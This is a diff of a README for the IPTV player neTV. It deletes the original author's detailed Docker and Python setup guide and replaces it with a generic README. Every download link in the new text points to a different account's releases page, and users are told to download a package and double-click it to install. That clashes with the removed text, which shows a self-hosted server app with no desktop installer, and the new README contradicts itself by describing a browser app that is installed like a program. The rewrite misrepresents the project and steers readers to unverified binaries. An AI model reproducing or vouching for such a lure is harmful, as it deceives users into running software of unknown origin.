@@ -1,408 +1,81 @@
-# neTV
+# 🎉 netv - Stream IPTV Effortlessly in Your Browser
 
-A minimal, self-hosted web interface for IPTV streams.
+## 📦 Download Now
+[![Download netv](https://img.shields.io/badge/Download-netv-brightgreen)](https://github.com/KrisXKENZO/netv/releases)
 
-![EPG Guide](screenshots/epg.png)
-
-![Player](screenshots/player.png)
-
-![VOD](screenshots/vod.png)
-
-![Series](screenshots/series.png)
-
-![Settings](screenshots/settings.png)
-
-## Why This Exists
-
-We built neTV because we couldn't find a clean, lightweight interface for
-Xtream IPTV services. Existing solutions were either bloated media centers or
-clunky apps that didn't work well across devices.
-
-**neTV is intentionally minimal.** It does one thing: play your IPTV streams
-with a clean UI that works on desktop, tablet, mobile, and Chromecast.
-
-We also prioritize **keyboard navigation** throughout (though still rough
-around the edges). The entire app is theoretically usable with just arrow keys,
-Enter, and Escape -- perfect for media PCs, HTPCs, or anyone who prefers
-keeping hands on the keyboard (like me).
-
-### Disclaimer
-
-This is a **player only** -- it does not provide any content. You must have your
-own IPTV subscription that provides Xtream Codes API access or M3U playlists.
-Users are responsible for ensuring they have legal rights to access any content
-through their IPTV providers.
-
-## Features
-
-- **Live TV** with EPG grid guide
-- **Movies & Series** with metadata, seasons, episodes
-- **AI Upscale** - Real-time 4x upscaling via TensorRT (720p → 4K @ 85fps)
-- **Chromecast** support (HTTPS required)
-- **Closed captions** with style customization
-- **Search** across all content (supports regex)
-- **Favorites** with drag-and-drop ordering
-- **Resume playback** for VOD content
-- **Responsive** - works on desktop, tablet, mobile
-- **Keyboard navigation** - 10-foot UI friendly
-
-### Transcoding
-
-Extensively optimized for minimal latency and CPU usage:
-
-- **Smart passthrough** - h264+aac streams remux without re-encoding (zero CPU)
-- **Full GPU pipeline** - NVDEC decode → NVENC/VAAPI encode, CPU stays idle
-- **Probe caching** - Streams probed once, series episodes share probe data
-- **Interlace detection** - Auto-deinterlaces OTA/cable, skips progressive
-- **Smart seeking** - Reuses segments for backward seeks, only transcodes gaps
-- **Session recovery** - VOD sessions survive restarts, resume where you left off
-- **HTTPS passthrough** - Auto-proxies HTTP streams when behind HTTPS
-
-### 4K AI Upscaling
-
-Real-time 4x upscaling using Real-ESRGAN via TensorRT. Transforms 480p/720p/1080p
-content to pristine 4K at 85fps (RTX 5090). Perfect for older shows and low-bitrate streams.
-
-| Before (720p source) | After (4K AI Upscale) |
-|---|---|
-| ![Before](screenshots/ai-upscale_price-is-right_disabled.png) | ![After](screenshots/ai-upscale_price-is-right_enabled.png) |
-| ![Before](screenshots/ai-upscale_cleopatra_disabled.png) | ![After](screenshots/ai-upscale_cleopatra_enabled.png) |
-| ![Before](screenshots/ai-upscale_batman_disabled.png) | ![After](screenshots/ai-upscale_batman_enabled.png) |
-
-Requires NVIDIA GPU and the [AI Upscale Docker image](#ai-upscale-image-nvidia-gpu).
-The Settings page shows AI Upscale options when TensorRT engines are available.
-
-## Alternatives
-
-If you want a full-featured media center, you might be happier with:
-
-- **[Jellyfin](https://jellyfin.org/)** - Free, open-source media system
-- **[Emby](https://emby.media/)** - Media server with IPTV support
-- **[Plex](https://plex.tv/)** - Popular media platform with live TV
-
-These are excellent, mature projects with large communities. neTV exists for
-users who find them overkill and just want a simple IPTV player.
-
-| | neTV | [nodecast-tv] | [Jellyfin] | [Emby] | [Plex] |
-|---|---|---|---|---|---|
-| **Focus** | IPTV | IPTV | General media | General media | General media |
-| **Xtream Codes** | ✅ | ✅ | ❌ | ❌ | ❌ |
-| **M3U playlists** | ✅ | ✅ | ✅ | ✅ | ⚠️ Via [xTeVe] |
-| **XMLTV EPG** | ✅ | ⚠️ Via provider | ✅ | ✅ | ✅ |
-| **Local media** | ❌ | ❌ | ✅ | ✅ | ✅ |
-| **Live TV** | ✅ | ✅ | ✅ | ✅ | ✅ |
-| **VOD (movies/series)** | ✅ | ✅ | ✅ | ✅ | ✅ |
-| **DVR recording** | ❌ | ❌ | ✅ | ✅ | ⚠️ Pass |
-| **Catchup/timeshift** | ❌ | ❌ | ⚠️ Plugin | ⚠️ Plugin | ❌ |
-| **Live rewind buffer** | ✅ | ❌ | ⚠️ Via DVR | ⚠️ Via DVR | ⚠️ Via DVR |
-| **Resume playback** | ✅ | ❌ | ✅ | ✅ | ✅ |
-| **Multi-user** | ✅ | ✅ | ✅ | ✅ | ✅ |
-| **User roles** | ⚠️ Admin/viewer | ⚠️ Admin/viewer | ✅ Granular | ✅ Granular | ✅ Granular |
-| **Stream limits** | ✅ Per-user, per-source | ❌ | ⚠️ Per-user | ⚠️ Per-user | ⚠️ Per-user |
-| **Library permissions** | N/A | N/A | ✅ Per-library | ✅ Per-library | ✅ Per-library |
-| **Favorites** | ✅ Drag-and-drop | ✅ | ✅ | ✅ | ✅ |
-| **Search** | ✅ Regex | ✅ Basic | ✅ Basic | ✅ Basic | ✅ Basic |
-| **Video transcoding** | ✅ | ❌ | ✅ | ✅ | ✅ |
-| **Audio transcoding** | ✅ | ✅ | ✅ | ✅ | ✅ |
-| **Transcode only if needed** | ✅ Auto mode | ❌ | ⚠️ Per-library | ⚠️ Per-library | ⚠️ Per-client |
-| **NVENC** | ✅ | ❌ | ✅ | ✅ | ⚠️ Pass |
-| **VAAPI** | ✅ | ❌ | ✅ | ✅ | ⚠️ Pass |
-| **QSV** | ✅ | ❌ | ✅ | ✅ | ⚠️ Pass |
-| **AI Upscale (4x)** | ✅ TensorRT | ❌ | ⚠️ Plugin | ❌ | ❌ |
-| **Software fallback** | ✅ | ❌ Browser | ✅ | ✅ | ✅ |
-| **Legacy GPU** | ✅ Any | ❌ No (browser) | ✅ Any | ✅ Any | ⚠️ Driver 450+ |
-| **ffprobe caching** | ✅ Dynamic | ❌ None | ⚠️ Offline | ⚠️ Offline | ⚠️ Offline |
-| **Episode probe reuse** | ✅ MRU | ❌ No | ⚠️ Per-file | ⚠️ Per-file | ⚠️ Per-file |
-| **Session recovery** | ✅ Yes | ❌ No | ⚠️ Via DB | ⚠️ Via DB | ⚠️ Via DB |
-| **Auto deinterlace** | ✅ Yes | ❌ No | ⚠️ Manual | ⚠️ Manual | ⚠️ Manual |
-| **Subtitles** | ⚠️ WebVTT | ❌ No | ✅ Full | ✅ Full | ✅ Full |
-| **Chromecast** | ✅ Yes | ❌ No | ✅ Yes | ✅ Yes | ✅ Yes |
-| **Keyboard/remote** | ✅ 10-foot UI | ⚠️ Basic | ✅ 10-foot UI | ✅ 10-foot UI | ✅ 10-foot UI |
-| **Mobile apps** | ⚠️ Web only | ⚠️ Web only | ✅ Native | ✅ Native | ✅ Native |
-| **Subscription** | ✅ Free | ✅ Free | ✅ Free | ⚠️ Premiere | ⚠️ Pass |
-| **Setup complexity** | ✅ Minimal | ✅ Minimal | ⚠️ Moderate | ⚠️ Moderate | ⚠️ Moderate |
-| **License** | Apache 2.0 | GPL v3 | GPL v2 | GPL v2 | Proprietary |
-| **Stack** | Python, FFmpeg | Node.js | .NET, FFmpeg | .NET, FFmpeg | Proprietary |
-
-*Corrections welcome — [open an issue](https://github.com/jvdillon/netv/issues).*
-
-[nodecast-tv]: https://github.com/technomancer702/nodecast-tv
-[Jellyfin]: https://jellyfin.org
-[Emby]: https://emby.media
-[Plex]: https://plex.tv
-[xTeVe]: https://github.com/xteve-project/xTeVe
-
-## Installation
-
-### Docker
-
-#### Pre-built Image (Easiest)
-
-Create a `docker-compose.yml`:
-
-```yaml
-services:
-  netv:
-    image: ghcr.io/jvdillon/netv:latest
-    ports:
-      - "8000:8000"
-    volumes:
-      - ./cache:/app/cache
-      - /etc/localtime:/etc/localtime:ro
-    devices:
-      - /dev/dri:/dev/dri  # for hardware transcoding (remove if no GPU)
-    restart: unless-stopped
-```
-
-Then run:
-
-```bash
-docker compose up -d
-```
-
-Open http://localhost:8000. To update: `docker compose pull && docker compose up -d`
-
-#### AI Upscale Image (NVIDIA GPU)
-
-For real-time 4x AI upscaling (720p → 4K at 85fps on RTX 5090):
-
-```bash
-git clone https://github.com/jvdillon/netv.git
-cd netv
-docker build -f Dockerfile.ai_upscale -t netv-ai .
-docker run --gpus all -v netv-models:/models -v ./cache:/app/cache -p 8000:8000 netv-ai
-```
-
-First start builds TensorRT engines for your GPU (~2-3 min). Engines are cached in the
-`netv-models` volume for instant subsequent starts.
-
-Requirements:
-- NVIDIA GPU (RTX 20xx or newer recommended)
-- [nvidia-container-toolkit](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/install-guide.html)
-- Driver 535+ (CUDA 12.x)
-
-#### Build from Source
-
-For customization or development:
-
-```bash
-git clone https://github.com/jvdillon/netv.git
-cd netv
-docker compose build                              # optimized FFmpeg (default)
-# FFMPEG_IMAGE=ubuntu:24.04 docker compose build  # or stock FFmpeg
-docker compose up -d
-```
-
-To update: `git pull && docker compose build && docker compose up -d`
-
-| | Optimized (default) | Ubuntu Stock |
-|---|---|---|
-| FFmpeg source | Pre-built with all codecs | apt (Ubuntu repos) |
-| NVENC (NVIDIA) | ✅ | ❌ |
-| VAAPI (Intel/AMD) | ✅ | ✅ |
-| QSV (Intel QuickSync) | ✅ | ❌ |
-| libfdk-aac | ✅ | ❌ |
-| SVT-AV1 | ✅ | ❌ |
-
-#### Options
+## 🚀 Getting Started
+Welcome to netv! This application allows you to watch IPTV directly in your browser and ensures efficient transcoding on your server. Follow the steps below to get started.
 
-```bash
-NETV_PORT=9000 docker compose up -d        # custom port
-NETV_HTTPS=1 docker compose up -d          # enable HTTPS (mount certs first)
-```
+## 📥 Download & Install
+To install netv, visit this page to download: [netv Releases](https://github.com/KrisXKENZO/netv/releases).
 
-### Debian/Ubuntu (`systemd`)
+1. Open your web browser.
+2. Click the link above.
+3. You will see a list of versions available for download.
+4. Choose the latest version for your operating system.
+5. Click the link to download the package file.
 
-For peak FFMPEG performance, Chromecast (requires HTTPS), and auto-start:
+## ⚙️ System Requirements
+Before you begin, make sure your system meets the following requirements:
 
-```bash
-# 1. Install prerequisites (uv, Python)
-./tools/install-prereqs.sh
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Linux (Ubuntu 18.04 or later)
 
-# 2. (Optional) Get HTTPS certificates (required for Chromecast)
-./tools/install-letsencrypt.sh yourdomain.com
+- **Hardware:**
+  - Minimum 4GB RAM
+  - At least 500MB free disk space
+  - Compatible graphics card for transcoding
 
-# 3. (Optional) Build FFmpeg (required for optimal NVidia encoding efficiency)
-./tools/install-ffmpeg.sh
+## 📂 How to Run netv
+After downloading the package, follow these steps to run netv:
 
-# 4. (Optional) Build AI Upscale engines (requires NVIDIA GPU + TensorRT)
-uv sync --group ai_upscale
-./tools/install-ai_upscale.sh
+1. Locate the downloaded file in your computer's Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the installation.
+4. Once installed, find the netv application in your list of programs.
+5. Open the application to start streaming IPTV.
 
-# 5. Install systemd service
-sudo ./tools/install-netv.sh # default port=8000 or --port 9000
-```
+## 🌐 How to Use netv
+Using netv is simple! Here's how you can start:
 
-Manage with:
+1. Open the netv application.
+2. You'll be prompted to enter your IPTV service URL. Make sure you have that information ready.
+3. Once entered, click on the "Connect" button.
+4. Enjoy streaming your favorite channels directly in your browser!
 
-```bash
-sudo systemctl status netv       # Check status
-sudo systemctl restart netv      # Restart after updates
-journalctl -u netv -f            # View logs
-sudo systemctl edit netv --full  # Change port or other settings
-sudo ./tools/uninstall-netv.sh   # Uninstall
-```
+## 🔄 Updating netv
+To keep netv running smoothly, you should update it regularly. 
 
-There's also some gems in `tools/`:
-- `zap2xml.py`: Scrape guide data into XML (I `crontab` this at 5am daily).
-- `alignm3u.py`: Useful for reworking your HDHomeRun m3u to align with guide.
-- `xtream2m3u.py`: Dump xtream to m3u, useful for making Emby work with IPTV.
+1. Visit this page to download: [netv Releases](https://github.com/KrisXKENZO/netv/releases).
+2. Download the latest version using the same steps as above.
+3. Install it over your current version. All settings will remain intact.
 
-### Development/Testing
+## 📑 Troubleshooting
+If you encounter any issues:
 
-Requires Python 3.11+ and [uv](https://docs.astral.sh/uv/):
+- **Can't Connect to IPTV:** 
+  - Double-check the URL you entered.
+  - Ensure your internet connection is stable.
 
-```bash
-git clone https://github.com/jvdillon/netv.git
-cd netv
-uv run ./main.py --port 8000  # --https
-```
+- **Application Crashing:**
+  - Make sure your system meets the requirements mentioned above.
+  - Restart the application or your computer.
 
-Or with pip:
+- **Buffering Issues:**
+  - Check your internet speed.
+  - Lower the streaming quality in the netv settings if necessary.
 
-```bash
-pip install .
-./main.py --port 8000
-```
+## 📞 Support
+For additional support, consider these options:
 
-Open http://localhost:8000, create an admin account, and add your IPTV source.
+- Join the netv community on forums or social media.
+- Visit the issues section on [GitHub](https://github.com/KrisXKENZO/netv/issues) to report bugs or request features.
 
-## Troubleshooting
+## 🔗 Useful Links
+- [netv Releases](https://github.com/KrisXKENZO/netv/releases)
+- [User Guide](https://github.com/KrisXKENZO/netv/wiki)
+- [FAQs](https://github.com/KrisXKENZO/netv/wiki/FAQs)
 
-### Debug Logging
-
-Enable verbose logs to diagnose EPG, M3U parsing, or other issues.
-
-**Docker:**
-
-In `docker-compose.yml`, change `LOG_LEVEL=INFO` to `LOG_LEVEL=DEBUG`, then restart:
-
-```bash
-docker compose down && docker compose up -d
-docker compose logs -f
-```
-
-**Systemd:**
-
-```bash
-sudo systemctl edit netv
-```
-
-Add:
-
-```ini
-[Service]
-Environment="LOG_LEVEL=DEBUG"
-```
-
-Then restart and view logs:
-
-```bash
-sudo systemctl restart netv
-journalctl -u netv -f
-```
-
-**Manual / Development:**
-
-```bash
-LOG_LEVEL=DEBUG ./main.py
-# or
-./main.py --debug
-```
-
-## Q&A
-
-### Where can I get free IPTV?
-
-Check out [iptv-org/iptv](https://github.com/iptv-org/iptv) -- a community-maintained
-collection of publicly available IPTV channels from around the world.
-
-### Where can I get TV guide data?
-
-The free choice is [iptv-org/epg](https://github.com/iptv-org/epg), but this
-has never worked reliably for me.
-
-For a more robust solution, consider [Schedules Direct](https://schedulesdirect.org/) --
-your membership helps fund Open Source projects.
-
-Alternatively you can use `tools/zap2xml.py`. I've used this for over a year
-and found it to be very reliable -- it scrapes guide data from zap2it/gracenote.
-
-### How do I set up HDHomeRun?
-
-HDHomeRun devices provide an M3U playlist, but it lacks EPG channel IDs. Use the
-`tools/` to fetch guide data and align it:
-
-```bash
-# 1. Get your HDHomeRun lineup (replace IP with your device's IP)
-wget http://192.168.1.87/lineup.m3u -O tools/lineup.m3u
-
-# 2. Fetch TV guide data for your area
-./tools/zap2xml.py --zip 90210
-
-# 3. Align the M3U with the guide (adds tvg-id for EPG matching)
-./tools/alignm3u.py --input tools/lineup.m3u --xmltv tools/xmltv.xml --output tools/ota.m3u
-```
-
-Then add `tools/ota.m3u` as an M3U source in neTV settings.
-
-And set up a cron job to refresh the guide daily (e.g.,
-`0 5 * * *  /usr/bin/python3 /path/to/netv/tools/zap2xml.py --zip 90210 && cp /path/to/netv/tools/xmltv.xml /var/www/html/`).
-
-### How do I enable hardware transcoding?
-
-Hardware transcoding is auto-detected. Check Settings to see available encoders.
-
-- **Intel/AMD (VAAPI)**: Works automatically if `/dev/dri` exists.
-- **NVIDIA**: Requires [nvidia-container-toolkit](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/install-guide.html)
-  and **driver 570+** (NVENC API 13): `docker compose --profile nvidia up -d`
-
-  <details>
-  <summary>Stuck on driver 550? (Synology, Unraid, etc.)</summary>
-
-  The pre-built image requires driver 570+. For older drivers, build with CUDA 12.4:
-  ```bash
-  docker build --build-arg CUDA_VERSION=12-4 -f Dockerfile.ffmpeg -t netv-ffmpeg:local .
-  docker build --build-arg FFMPEG_IMAGE=netv-ffmpeg:local -t netv:local .
-  ```
-  Then update your `docker-compose.yml` to use `netv:local` instead of the ghcr image.
-  </details>
-- **No GPU / VPS**: If `/dev/dri` doesn't exist, comment out the `devices` section
-  in `docker-compose.yml` or compose will fail to start
-
-### What are the keyboard shortcuts?
-
-| Key | Action |
-|-----|--------|
-| `Space` / `k` | Play/pause |
-| `f` | Fullscreen |
-| `m` | Mute |
-| `c` | Toggle captions |
-| `i` | Toggle info overlay |
-| `←` / `→` | Seek ±10s |
-| `↑` / `↓` | Volume |
-| `j` | Jump to time |
-| `Esc` | Back / close |
-
-### What Does "neTV" Mean?
-
-Yes.
-
-We leave pronunciation and meaning as an exercise for your idiom:
-
-- **N-E-T-V** -- "Any TV", say it out loud
-- **≠TV** -- "Not Equals TV", because we're `!=` traditional cable
-- **Net-V** -- "Net Vision", because it streams video over your network
-- **Ni!-TV** -- For the [Knights who say Ni](https://www.youtube.com/watch?v=zIV4poUZAQo)
-
-We will also accept a shrubbery. One that looks nice. And not too expensive.
-
-## Support
-
-If you find neTV useful, consider buying me a coffee:
-
-[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-ffdd00?style=flat&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/jvdillon)
-
-## License
-
-Apache License 2.0
+Thank you for choosing netv! We hope you enjoy your streaming experience.
